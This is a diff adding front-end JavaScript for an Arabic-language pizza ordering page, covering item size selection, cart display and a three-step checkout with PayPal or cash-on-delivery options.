+                const sizes = currentItem.isSide ? ['small','medium'] : ['small','medium','large'];
+                const isSelected = sizes[i]===size;
+                btn.classList.toggle('selected', isSelected);
+                btn.querySelector('span:first-child, .size-icon')?.classList?.toggle('text-[#00B140]', isSelected);
+                btn.querySelector('span:first-child, .size-icon')?.classList?.toggle('text-neutral-400', !isSelected);
+                btn.querySelector('span:first-child, .size-icon')?.classList?.toggle('text-neutral-500', !isSelected);
+                btn.querySelector('.size-price')?.classList?.toggle('text-[#00B140]', isSelected);
+                btn.querySelector('.size-price')?.classList?.toggle('text-neutral-400', !isSelected);
+            });
+        }
+
+        function changeQty(d) {
+            modalQty = Math.max(1, Math.min(20, modalQty+d));
+            document.getElementById('modal-qty').textContent = modalQty;
+        }
+
+        function closeSizeModal() { document.getElementById('size-modal').classList.add('hidden'); currentItem=null; }
+
+        function confirmAdd() {
+            if(!currentItem) return;
+            const price = currentItem.prices[selectedSize];
+            const sizeLabel = selectedSize==='small'?'صغير':selectedSize==='medium'?(currentItem.isSide?'كبير':'وسط'):'كبير';
+            for(let i=0;i<modalQty;i++){
+                cart.push({ id:currentItem.id, name:currentItem.name, nameIt:currentItem.nameIt, size:sizeLabel, price, image:currentItem.image });
+            }
+            updateCart();
+            closeSizeModal();
+            showToast(`تمت إضافة ${modalQty>1?modalQty+'x ':''}${currentItem.name} (${sizeLabel})`);
+        }
+
+        // ==================== CART ====================
+        function updateCart() {
+            const countEl=document.getElementById('cart-count'), itemsEl=document.getElementById('cart-items'), footerEl=document.getElementById('cart-footer'), totalEl=document.getElementById('cart-total'), subEl=document.getElementById('cart-subtotal'), delEl=document.getElementById('cart-delivery');
+            if(cart.length===0) {
+                countEl.classList.add('hidden'); footerEl.classList.add('hidden');
+                itemsEl.innerHTML=`<div class="flex flex-col items-center justify-center h-full text-center"><span class="iconify text-4xl text-neutral-700 mb-3" data-icon="lucide:shopping-bag"></span><p class="text-neutral-500 text-sm">سلتك فارغة</p><p class="text-neutral-600 text-[10px] mt-1">أضف بيتزا إيطالية لذيذة!</p></div>`;
+                return;
+            }
+            countEl.classList.remove('hidden'); countEl.textContent=cart.length; footerEl.classList.remove('hidden');
+            const sub=cart.reduce((s,i)=>s+i.price,0);
+            const del=sub>=60?0:10;
+            totalEl.textContent=(sub+del)+' ر.س';
+            subEl.textContent=sub+' ر.س';
+            delEl.textContent=del===0?'مجاني ✓':del+' ر.س';
+            delEl.classList.toggle('text-[#00B140]', del===0);
+            delEl.classList.toggle('text-neutral-400', del!==0);
+
+            // Merge duplicates for display
+            const merged = {};
+            cart.forEach((item,idx) => {
+                const key = item.id+'-'+item.size;
+                if(!merged[key]) merged[key] = {...item, count:0, indices:[]};
+                merged[key].count++;
+                merged[key].indices.push(idx);
+            });
+
+            itemsEl.innerHTML = Object.values(merged).map(item=>`
+                <div class="flex items-center gap-3 p-3 rounded-xl bg-white/5 border border-white/5 animate-scale-in">
+                    <div class="w-12 h-12 rounded-lg overflow-hidden flex-shrink-0"><img src="${item.image}" alt="" class="w-full h-full object-cover"/></div>
+                    <div class="flex-1 min-w-0">
+                        <div class="text-xs font-medium truncate">${item.name} <span class="text-neutral-600 font-italian italic">${item.nameIt}</span></div>
+                        <div class="text-[9px] text-neutral-500">${item.size} × ${item.count}</div>
+                    </div>
+                    <div class="text-xs font-bold text-[#00B140] flex-shrink-0">${item.price*item.count} ر.س</div>
+                    <button onclick="removeItemGroup(${JSON.stringify(item.indices).replace(/"/g,'&quot;')})" class="w-6 h-6 rounded-full bg-white/5 flex items-center justify-center hover:bg-red-500/20 transition-colors flex-shrink-0"><span class="iconify text-[10px] text-neutral-500" data-icon="lucide:x"></span></button>
+                </div>
+            `).join('');
+        }
+
+        function removeItemGroup(indices) {
+            const sorted = [...indices].sort((a,b)=>b-a);
+            const removed = cart[sorted[0]];
+            sorted.forEach(i=>cart.splice(i,1));
+            updateCart();
+            showToast(`تم حذف ${removed.name}`, 'remove');
+        }
+
+        function openCart() {
+            document.getElementById('cart-overlay').classList.remove('hidden');
+            document.getElementById('cart-sidebar').style.transform='translateX(0)';
+            document.body.style.overflow='hidden';
+        }
+        function closeCart() {
+            document.getElementById('cart-overlay').classList.add('hidden');
+            document.getElementById('cart-sidebar').style.transform='translateX(-100%)';
+            document.body.style.overflow='';
+        }
+
+        // ==================== CHECKOUT ====================
+        function openCheckout() {
+            if(cart.length===0) return;
+            closeCart();
+            setTimeout(()=>{
+                resetCheckoutSteps();
+                document.getElementById('checkout-modal').classList.remove('hidden');
+                document.body.style.overflow='hidden';
+            },300);
+        }
+        function closeCheckout() {
+            document.getElementById('checkout-modal').classList.add('hidden');
+            document.body.style.overflow='';
+        }
+
+        function resetCheckoutSteps() {
+            showStep(1);
+            document.getElementById('inp-name').value='';
+            document.getElementById('inp-phone').value='';
+            document.getElementById('inp-address').value='';
+            document.getElementById('inp-notes').value='';
+            document.getElementById('inp-paypal').value='';
+            document.getElementById('step1-error').classList.add('hidden');
+            document.getElementById('step2-error').classList.add('hidden');
+            paymentMethod='paypal';
+        }
+
+        function showStep(n) {
+            document.getElementById('checkout-step1').classList.toggle('hidden',n!==1);
+            document.getElementById('checkout-step2').classList.toggle('hidden',n!==2);
+            document.getElementById('checkout-step3').classList.toggle('hidden',n!==3);
+            for(let i=1;i<=3;i++){
+                const el=document.getElementById('step'+i);
+                el.className = i<n ? 'step-done w-8 h-8 rounded-full flex items-center justify-center text-xs font-bold' : i===n ? 'step-active w-8 h-8 rounded-full flex items-center justify-center text-xs font-bold' : 'step-pending w-8 h-8 rounded-full flex items-center justify-center text-xs font-bold';
+                el.textContent = i<n ? '✓' : i;
+            }
+        }
+
+        function goToStep1() { showStep(1); }
+
+        function goToStep2() {
+            const name=document.getElementById('inp-name').value.trim();
+            const phone=document.getElementById('inp-phone').value.trim();
+            const addr=document.getElementById('inp-address').value.trim();
+            if(!name||!phone||!addr) { document.getElementById('step1-error').classList.remove('hidden'); return; }
+            document.getElementById('step1-error').classList.add('hidden');
+
+            // Fill summary
+            const merged={};
+            cart.forEach(item=>{ const k=item.id+'-'+item.size; if(!merged[k]) merged[k]={...item,count:0}; merged[k].count++; });
+            const sub=cart.reduce((s,i)=>s+i.price,0);
+            const del=sub>=60?0:10;
+            document.getElementById('checkout-summary').innerHTML=Object.values(merged).map(i=>`
+                <div class="flex items-center justify-between text-[10px]">
+                    <span class="text-neutral-400">${i.name} (${i.size}) ×${i.count}</span>
+                    <span class="text-neutral-300">${i.price*i.count} ر.س</span>
+                </div>
+            `).join('');
+            document.getElementById('checkout-total').textContent=(sub+del)+' ر.س';
+            showStep(2);
+        }
+
+        function selectCash(el) {
+            paymentMethod='cash';
+            document.getElementById('paypal-form').classList.add('hidden');
+            el.parentElement.querySelectorAll('label').forEach(l=>{
+                l.classList.remove('border-2','border-[#00953E]','bg-[#00953E]/5');
+                l.classList.add('border','border-white/10','bg-white/5');
+                l.querySelector('.text-sm')?.classList?.add('text-neutral-400');
+                l.querySelector('.text-sm')?.classList?.remove('text-white');
+                const dot=l.querySelector('.w-5 > div');
+                if(dot){dot.classList.remove('bg-[#00953E]','w-2.5','h-2.5');dot.classList.add('w-0','h-0');}
+                const ring=l.querySelector('.w-5');
+                if(ring){ring.classList.remove('border-[#00953E]');ring.classList.add('border-white/20');}
+            });
+            el.classList.remove('border','border-white/10','bg-white/5');
+            el.classList.add('border-2','border-[#00953E]','bg-[#00953E]/5');
+            el.querySelector('.text-sm')?.classList?.remove('text-neutral-400');
+            const dot=el.querySelector('.w-5 > div');
+            if(dot){dot.classList.add('bg-[#00953E]','w-2.5','h-2.5');dot.classList.remove('w-0','h-0');}
+            const ring=el.querySelector('.w-5');
+            if(ring){ring.classList.add('border-[#00953E]');ring.classList.remove('border-white/20');}
+        }
+
+        // Also handle PayPal label click to reset
+        document.addEventListener('click',function(e){
+            const paypalLabel = e.target.closest('label:has(input[value="paypal"])');
+            if(paypalLabel && paymentMethod!=='paypal'){
+                paymentMethod='paypal';
+                document.getElementById('paypal-form').classList.remove('hidden');
+                // Reset all labels
+                paypalLabel.parentElement.querySelectorAll('label').forEach(l=>{
+                    l.classList.remove('border-2','border-[#00953E]','bg-[#00953E]/5');
+                    l.classList.add('border','border-white/10','bg-white/5');
+                    l.querySelectorAll('.text-sm').forEach(s=>{s.classList.add('text-neutral-400');s.classList.remove('text-white');});
+                    const dot=l.querySelector('.w-5 > div');
+                    if(dot){dot.classList.remove('bg-[#00953E]','w-2.5','h-2.5');dot.classList.add('w-0','h-0');}
+                    const ring=l.querySelector('.w-5');
+                    if(ring){ring.classList.remove('border-[#00953E]');ring.classList.add('border-white/20');}
+                });
+                // Activate PayPal
+                paypalLabel.classList.remove('border','border-white/10','bg-white/5');
+                paypalLabel.classList.add('border-2','border-[#00953E]','bg-[#00953E]/5');
+                paypalLabel.querySelectorAll('.text-sm').forEach(s=>{s.classList.remove('text-neutral-400');});
+                const dot=paypalLabel.querySelector('.w-5 > div');
+                if(dot){dot.classList.add('bg-[#00953E]','w-2.5','h-2.5');dot.classList.remove('w-0','h-0');}
+                const ring=paypalLabel.querySelector('.w-5');
+                if(ring){ring.classList.add('border-[#00953E]');ring.classList.remove('border-white/20');}
+            }
+        });
+
+        function goToStep3() {
+            if(paymentMethod==='paypal') {
+                const email=document.getElementById('inp-paypal').value.trim();
+                if(!email||!email.includes('@')) { document.getElementById('step2-error').classList.remove('hidden'); document.getElementById('step2-error').textContent='يرجى إدخال بريد PayPal صحيح'; return; }
+            }
+            document.getElementById('step2-error').classList.add('hidden');
+
+            // Generate order number
+            const orderNum = '#LP-' + String(Math.floor(10000+Math.random()*90000));
+            document.getElementById('order-number').textContent = orderNum;
+
+            const sub=cart.reduce((s,i)=>s+i.price,0);
+            const del=sub>=60?0:10;
+            const total=sub+del;
+
+            const merged={};
+            cart.forEach(item=>{ const k=item.id+'-'+item.size; if(!merged[k]) merged[k]={...item,count:0}; merged[k].count++; });
+
+            document.getElementById('confirmation-details').innerHTML=`
+                <div class="flex justify-between"><span class="text-neutral-500">الاسم</span><span>${document.getElementById('inp-name').value}</span></div>
+                <div class="flex justify-between"><span class="text-neutral-500">الجوال</span><span dir="ltr">${document.getElementById('inp-phone').value}</span></div>
+                <div class="flex justify-between"><span class="text-neutral-500">العنوان</span><span class="text-left max-w-[200px]">${document.getElementById('inp-address').value}</span></div>
+                <div class="flex justify-between"><span class="text-neutral-500">الدفع</span><span>${paymentMethod==='paypal'?'PayPal':'نقداً عند الاستلام'}</span></div>
+                <div class="border-t border-white/5 my-2"></div>
+                ${Object.values(merged).map(i=>`<div class="flex justify-between"><span class="text-neutral-400">${i.name} (${i.size}) ×${i.count}</span><span>${i.price*i.count} ر.س</span></div>`).join('')}
+                <div class="border-t border-white/5 my-2"></div>
+                <div class="flex justify-between"><span class="text-neutral-500">التوصيل</span><span>${del===0?'مجاني':del+' ر.س'}</span></div>
+                <div class="flex justify-between font-bold"><span>الإجمالي</span><span class="text-[#00B140]">${total} ر.س</span></div>
+            `;
+
+            showStep(3);
+        }
+
+        function finishOrder() {
+            cart=[];
+            updateCart();
+            closeCheckout();
+            showToast('شكراً لطلبك! سنتواصل معك قريباً 🇮🇹', 'success');
+        }
+
+        // ==================== TOAST ====================
+        function showToast(msg, type='add') {
+            const c=document.getElementById('toast-container');
+            const t=document.createElement('div');
+            const bg=type==='remove'?'bg-red-500/10 border-red-500/20':type==='success'?'bg-[#00953E]/10 border-[#00953E]/20':'bg-[#00953E]/10 border-[#00953E]/20';
+            const ic=type==='remove'?'text-red-400 lucide:minus-circle':type==='success'?'text-[#00B140] lucide:check-circle':'text-[#00B140] lucide:check';
+            t.className=`toast flex items-center gap-2 px-4 py-2.5 rounded-xl ${bg} border backdrop-blur-md max-w-[300px]`;
+            t.innerHTML=`<span class="iconify ${ic} flex-shrink-0"></span><span class="text-xs text-neutral-200">${msg}</span>`;
+            c.appendChild(t);
+            setTimeout(()=>{ t.classList.add('toast-exit'); setTimeout(()=>t.remove(),300); },2800);
+        }
+
+        // ==================== MOBILE MENU ====================
+        function toggleMobileMenu() { document.getElementById('mobile-menu').classList.toggle('hidden'); }
+
+        // ==================== INIT ====================
+        document.addEventListener('DOMContentLoaded', ()=>{
+            renderMenu();
+            window.addEventListener('scroll',()=>{
+                const nav=document.querySelector('nav');
+                nav.classList.toggle('border-white/10', window.scrollY>50);
+                nav.classList.toggle('border-white/5', window.scrollY<=50);
+            });
+        });
+    </script>
 </body>
 </html>
